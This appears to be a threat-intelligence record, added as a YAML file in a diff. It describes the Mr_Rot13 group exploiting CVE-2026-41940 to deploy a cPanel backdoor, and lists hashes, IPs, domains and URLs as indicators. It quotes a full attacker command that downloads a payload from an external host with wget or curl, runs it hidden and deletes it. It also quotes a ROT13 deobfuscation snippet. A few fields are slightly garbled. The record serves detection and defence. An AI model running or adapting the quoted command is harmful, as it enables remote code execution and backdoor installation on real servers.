@@ -1,0 +1,64 @@
+title: Threat Actor Mr_Rot13 Actively Exploits CVE-2026-41940 for Backdoor Deployment
+description: A campaign involving a file manager malware that establishes persistence
+  and communicates with multiple C2 servers.
+attribution: Mr_Rot13
+malware_families:
+- Payload
+- File Manager
+cves:
+- CVE-2026-41940
+ttps:
+  processes:
+  - curl
+  - ./filemanager-linux-amd64
+  command_lines:
+  - F=/root/.u$$; (wget -q -O "$F" 'https://cp.dene[.]de.com/Update' 2>/dev/null ||curl
+    -sk -o "$F" 'https://cp.dene[.]de.com/Update') && chmod 755 "$F" && (nohup "$F"
+    -s >/dev/null 2>&1 &) && sleep 2; rm -f "$F"
+  - ./filemanager-linux-amd64 -hashPassword:$2a$10$aE3xVi0asr/UKmnh/ewcPOK/pSkSr4AQasjZuIDjRA06Pb26w94hq
+  - ./filemanager-linux-amd64 -user xlab -pass-hash '$2a$10$aE3xVi@asr/UKmnh/ewcP)
+  powershell: []
+  scripts:
+  - https:]//cp.dene.de.]com/cpanel.py
+  - https[:]//wrned.com/log[.]php?t=3
+  - 'function Loadep(ss) {return (ss + *'').replace(/[2-z]/gi, function(s) {return
+    String.fromCharCode(s.charCodeAt(0) + (s.toLowerCase() < ''n'' ? 13 : -13))})'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - Payload -> wrned[.]com:443
+  - Payload -> cp.dene[.]de.com:80
+  - Filemanager -> wpsock[.]com:80
+  file_activity:
+  - /root/.u$$
+  - /usr/local/cpanel/cgi-sys/cpanel.py
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+  - fb1bc3f935fdeb3555465070ba2db33c
+  - 9305b4ebbb4d39907cf36b62989a6af3
+  - 2286f126ab4740ccf2595ad1fa0c615c
+  - 2de27ca8d97124adaf604b18161a441e
+  - 29222f5e73dd10088fcf1204aa21f87f
+  - 45fc93426cf08f91c9f9de5f04a12263
+  - 711afb014f64c97d7b31685709c34ce7
+  - 22613c952459e65ce09fb6b5c1c03d47
+  - e49f68a363c867608972680799389daf
+  - e1ec6ebb96cf87c785ee6a7da677c059
+  - 02a5990b11293236e01f174f5999df20
+  - bae1f1bce7c82fa86f05b12e2e254cfc
+  ip_addresses:
+  - 178.249.209.182
+  - 149.102.229.146
+  domains:
+  - wrned[.]com
+  - cp.dene[.]de.com
+  - wpsock[.]com
+  urls:
+  - https[:]//wrned.com/log[.]php?t=3
+  - https[:]//wpsock[.]com/cpanel/install.sh
+authors: []
+reference: https://blog.xlab.qianxin.com/mr_rot13-the-elusive-6-year-hacker-group-weaponizing-critical-cpanel-flaws-for-backdoor-deployment/
+date_of_publication: May 11, 2026
+file_creation_date: May 14, 2026
